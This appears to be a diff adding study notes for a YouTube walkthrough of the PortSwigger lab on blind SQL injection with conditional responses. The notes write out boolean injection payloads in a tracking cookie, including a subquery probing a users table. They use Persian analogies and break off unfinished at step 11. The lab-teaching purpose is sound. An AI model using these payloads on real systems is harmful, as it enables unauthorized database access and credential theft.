@@ -1,0 +1,150 @@
+Episode11- YouTube Channel AcronProject:
+
+    Source: https://portswigger.net/web-security/sql-injection/blind
+    Title:  Lab: Blind SQL injection with conditional responses
+    Lab:    https://portswigger.net/web-security/sql-injection/blind/lab-conditional-responses    
+    
+    vulnerable parameter - tracking cookie
+    dont anything to show in browser = cant use UNION based injection
+    Target:
+        1- Enumerate the Password of the administrator
+        2- Log in as the administrator user
+
+    Detection Black Box :
+        3- Send this packet HTTP to repeater by right click
+        4- intercept is off
+        5- Confirm that the parameter is vulnerable to blind SQLi
+        |    6- Query from Cookie to database vulnerable:
+        |        select tracking-id from tracking-table where trackingId = 'Paste here Cookie from browser'
+        |
+        |    7- Now, in fact, the correct logic should be like this:
+        |        # Secure logic code:
+        |            7-1- if True Return message
+        |            7-2- if tracking id exists           -------------> Query returns value   = True  => Wellcome back message
+        |            7-3- if the tracking id doesn't exists  ----------> Query returns nothing = False => no Wellcome back message
+        |        # 1-1 What if it was vulnerable?
+        |            7-4- if True + True  Return message !!!!
+        |            7-5- if tracking id exists + (Inject = True) -----> Query returns value   = True  => Wellcome back message !!!!!!! :/
+        |                                                But:                                                   in 8-3
+        |
+        |    8- #-Payload-1: 
+        |        8-1- select tracking-id from tracking-table where trackingId = 'Paste here Cookie from browser'
+        |                                                                                                      ' and 1=1--   
+        |        8-2- select tracking-id from tracking-table where trackingId = 'Paste here Cookie from browser' and 1=1--'
+        |        8-3- select tracking-id from tracking-table where trackingId = 'asDAWF2$DSGX!123!EXV' and 1=1--'
+        |                                                                                                    
+        |    9- #-Payload-2:
+        |        # 1-2 What if it was vulnerable?
+        |        if tracking id exists + (Inject = False) -----> Query returns value           = False => no Wellcome back message !!!!!!! :/
+        |        9-1- select tracking-id from tracking-table where trackingId = 'asDAWF2$DSGX!123!EXV' and 1=0--'
+        |
+        |    Result ==> Payload1 + Payload2 = get information in blind SQLi 
+        |
+        10-Confirm that we have a users table:
+        |        7-4- if True + True  Return message !!!!
+        |        10-1- select tracking-id from tracking-table where trackingId = 'asDAWF2$DSGX!123!EXV'
+        |        10-2- select tracking-id from tracking-table where trackingId = 'asDAWF2$DSGX!123!EXV '
+        |        10-2- select tracking-id from tracking-table where trackingId = 'asDAWF2$DSGX!123!EXV' '
+        |        10-2- select tracking-id from tracking-table where trackingId = 'asDAWF2$DSGX!123!EXV'  '
+        |        10-2- select tracking-id from tracking-table where trackingId = 'asDAWF2$DSGX!123!EXV' and '
+        |        10-2- select tracking-id from tracking-table where trackingId = 'asDAWF2$DSGX!123!EXV' and  '
+        |        10-3- select tracking-id from tracking-table where trackingId = 'asDAWF2$DSGX!123!EXV' and True--' 
+                Blind SQL injection with conditional responses Examples  {
+                ۱- اگر قد تمام افراد این کلاس کمتر از ۱۷۰ سانتی باشه این کلاس برنده است
+                ۲- اگر قد تمامشون کمتر از ۱۷۰ باشه و سنشون بیشتر از ۱۰ سال باشه این کلاس برنده است
+                ۳- اگر تمام نمره هات بیشتر از ۱۵ باشه و مامانت ازت راضی باشه برات یه چیزی می خرم
+
+                Result = True 
+                Result = Win
+                Result = accept
+                Result = passed
+                Result = elapsed
+                Result = قبول شده
+                تایید شده
+                پاس شده
+                برنده شده}
+        |        10-2- select tracking-id from tracking-table where trackingId = 'asDAWF2$DSGX!123!EXV' and (True)=True--'
+        |        10-2- select tracking-id from tracking-table where trackingId = 'asDAWF2$DSGX!123!EXV' and True--'
+        |        10-4- select tracking-id from tracking-table where trackingId = 'asDAWF2$DSGX!123!EXV' and (select 'x' from users LIMIT 1)='x'--'
+        |
+        |   Result ==> users table exists in the database.
+        |
+        11- Confirm 
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
